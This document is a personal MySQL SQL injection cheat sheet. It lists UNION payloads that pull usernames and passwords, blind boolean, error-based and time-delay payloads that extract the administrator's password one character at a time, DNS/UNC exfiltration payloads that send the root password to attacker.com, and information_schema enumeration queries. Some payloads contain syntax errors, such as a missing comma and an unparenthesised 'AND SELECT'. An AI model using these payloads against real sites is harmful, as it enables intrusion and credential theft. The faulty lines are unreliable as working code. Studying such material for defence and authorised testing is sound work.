
## My SQLi

### Retreaving Database version

```mysql
SELECT @@version
```

**UNION Statement Context**
```
' UNION SELECT NULL, @@version -- -
```

> **Note:** In UNION Statement we have to match the number of columns of first select statement so that's why we use one NULL in the payload.

### String Concatenation

```
SELECT CONCAT(username, password) FROM Users
```

**UNION Statement Context**

```
' UNION SELECT NULL,CONCAT(username, ':', password) FROM Users-- -
```

### Substring

```
SELECT SUBSTRING(password, 2,1) FROM users where username = 'administrator'
```

> **Note:** In the above query we only extract second character of Administrator users password with the length of one that's mean only one character at a time. SUBSTRING Function has a syntax like this `SUBSTRING(string , start position, total length)`

**In a blind SQLi Context where we have some difference in response**

```
' AND SELECT SUBSTRING((SELECT Password FROM Users Where Username = 'Administrator'),1,1) = FUZZ
```
> **Note:** Suppost we have a blind SQLi in which we have some difference in response like Content Length or any wellcome back message of successfull login etc. Using above query we add a True or False condition using `AND` keyword so when  Password of the Administrator user have a character equal to or FUZZ character then they shows us a welcome back message or different content length otherwise they didn't show us that.
> In FUZZ we have a dictionary that contain all alpha-numeric characters and symbols.

### Conditional Errors

```mysql
SELECT IF(SUBSTRING((SELECT Password From User where Usersname = 'Administrator') ,1,1) = FUZZ , 1/0,True)
```

**In SQLi Context**

```mysql
' AND select if(substring((select password from users where username = "administrator")1,1) = FUZZ, 1/0, True )
```

### Time Delays

```
SELECT SLEEP(10)
```

**Blind SQLi Context**

```
' AND select if(substring((select password from users where username = "administrator")1,1) = FUZZ, SLEEP(5), True )
```

### DNS Lookups

```
# Only Works on windows

LOAD_FILE('\\\\attacker.com\\a')

SELECT ... INTO OUTFILE '\\\\attacker.com\a'
```

**SQLi Context**

```
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root'  
LIMIT 1),'.attacker.com\\foobar'));
```

```
SELECT @@version into outfile '\\\\attacker.com\\temp
```

### Database Contents

**List all the tables**
```
SELECT * FROM information_schema.tables
```

**USING UNION Statement**
```
' UNION SELECT Null, table_name FROM information_schema.tables
```


**List all the columns in a Table**
```
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```

**Using UNION Statement**
```
' UNION SELECT NULL, column_name FROM information_schema.columns where table_name = 'TABLE_NAME_HERE'
```